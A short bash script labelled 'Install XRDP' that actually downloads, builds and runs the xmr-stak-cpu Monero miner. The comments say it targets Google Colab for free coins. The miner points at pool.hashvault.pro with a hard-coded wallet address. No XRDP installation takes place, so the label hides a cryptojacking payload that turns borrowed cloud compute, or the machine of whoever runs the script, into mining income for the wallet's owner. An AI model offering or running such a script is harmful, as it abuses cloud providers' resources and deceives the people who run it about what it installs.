#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
sudo apt install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
wget https://github.com/fireice-uk/xmr-stak-cpu/archive/master.zip
unzip master.zip
cd xmr-stak-cpu-master
cmake .
make install
cd bin
./xmr-stak-cpu --url pool.hashvault.pro:80 --user ccx7Eeb3w4LMQbkzAaqHDJjn6x45yvvV7TYnCZ2HtEJNeifSxnamLKjEYR6ngKZ2Z1NYVPNWsiXNg33w3MLEijiQ3E3GD1FfzD --pass x --currency cryptonight_gpu



	

